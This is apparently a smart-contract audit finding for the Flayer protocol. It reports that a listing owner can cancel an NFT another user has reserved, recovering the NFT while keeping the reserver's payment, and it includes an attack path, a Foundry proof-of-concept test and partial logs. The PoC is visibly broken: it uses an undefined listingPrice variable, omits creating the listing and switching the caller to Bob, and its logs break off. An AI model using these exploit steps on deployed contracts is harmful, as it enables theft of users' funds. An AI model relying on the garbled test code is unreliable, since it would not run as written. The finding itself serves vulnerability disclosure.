# Reserved NFTs can be canceled and withdrawn by the initial listing creator

### Summary

The Flayer protocol allows users to reserve NFTs which they can't fully pay at the moment via the [reserve()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L690-L759) function, users that reserve NFTs pay interest rate, and have to provide initial collateral. The user reserving the NFT also has to pay the current listed price of the NFT minus the floor price to the user who created the listing. However, right after the NFT is reserved, the user who created the initial listing can cancel it via the [cancelListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L414-L470) function, and withdraw the NFT and in the same time collect the difference between the price he set for his NFT and the floor price(which is 1e18 * 10**token denomination).  First of all this breaks a core invariant of the protocol, secondly it results in the user who canceled the listing directly stealing funds from the user who reserved the NFT.

### Root Cause

There are no checks in the [cancelListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L414-L470) function that prevent the owner of the listing from canceling and withdrawing an NFT that was reserved by someone else. 

### Internal pre-conditions

1. NFT collection is created and initialized
2. Some user creates a liquid listing
3. Another users decides to reserve an NFT, that was put on a market as a liquid listing

### External pre-conditions

_No response_

### Attack Path

1. A malicious user creates a listing, with a floorMultiplier of **200**
2. Bob sees that listing, but doesn't have the money to buy it, but deep down he knows that owning this NFT will change his life, so he decides to reserve it via the [reserve()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L690-L759) function, he pays to alice the difference between the listingPrice and the listingFloorPrice which is 2e18 - 1e18 = 1e18, additionally he provides 0.5e18 as collateral. So in total bob has spend 1.5e18 tokens so far. Now he has the NFT as reserved and will have to pay some interest until he decides to unlock his protected listing(this is not important for this issue).
3. The malicious user sees that his NFT has been reserved, and decides to call the  [cancelListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L414-L470) function, in order to withdraw his NFT.
4. At the end of the attack the malicious user has received 1e18 tokens, owns his NFT, and bob has paid 1.5e18 tokens and can't withdraw the NFT, as it is no longer owned by the ``Locker.sol`` contract. 

### Impact
Users that reserve an NFT should be able to unlock it at any given time, as long as they pay their interest rate. A malicious user can cancel a listing that was reserved, and thus still funds from the user who reserved the NFT, and get back his NFT and generate a profit.

After following the steps in the above mentioned [gist](https://gist.github.com/AtanasDimulski/95fe424bd5c38a08b7d12cc5c3911878) add the following test to the ``AuditorTests.t.sol`` file:
```solidity
    function test_ReservingCanBeCanceledAndWithdrawn() public {
        vm.startPrank(alice);
        collection1.mint(alice, 12);
        collection1.setApprovalForAll(address(listings), true);

        Listings.Listing memory listingAlice = IListings.Listing({
            owner: payable(alice),
            created: uint40(block.timestamp),
            duration: 10 days,
            floorMultiple: 200
        });

        uint256[] memory tokenIdsAlice = new uint256[](1);
        tokenIdsAlice[0] = 12;

        uint256[] memory tokenIdsBob = new uint256[](2);
        tokenIdsBob[0] = 13;
        tokenIdsBob[1] = 14;
        locker.deposit(address(collection1), tokenIdsBob);
        console2.log("Bob token balance: ", collectionTokenA.balanceOf(bob));
        collectionTokenA.approve(address(listings), type(uint256).max);

        console2.log("The full price of the NFT that bob wants to reserve: ", listingPrice);
        listings.reserve(address(collection1), 12, 0.5e18);
        
        /// @notice bob will have to pay the difference between the full price of the NFT and the floor price 2e18 - 1e18 = 1e18, and pay 0.5e18 as collateral
        console2.log("Bob token balance after he reservers: ", collectionTokenA.balanceOf(bob));
        vm.stopPrank();

        vm.startPrank(alice);
        collectionTokenA.approve(address(listings), type(uint256).max);
        listings.cancelListings(address(collection1), tokenIdsAlice, false);
        assertEq(collection1.ownerOf(12), alice);
        console2.log("Token balance of alice: ", collectionTokenA.balanceOf(alice));
        console2.log("Token balance of bob: ", collectionTokenA.balanceOf(bob));
        vm.stopPrank();
    }
```

```solidity
Logs:
  Bob token balance:  2000000000000000000
  The full price of the NFT that bob wants to reserve:  2000000000000000000
  Bob token balance after he reservers:  500000000000000000
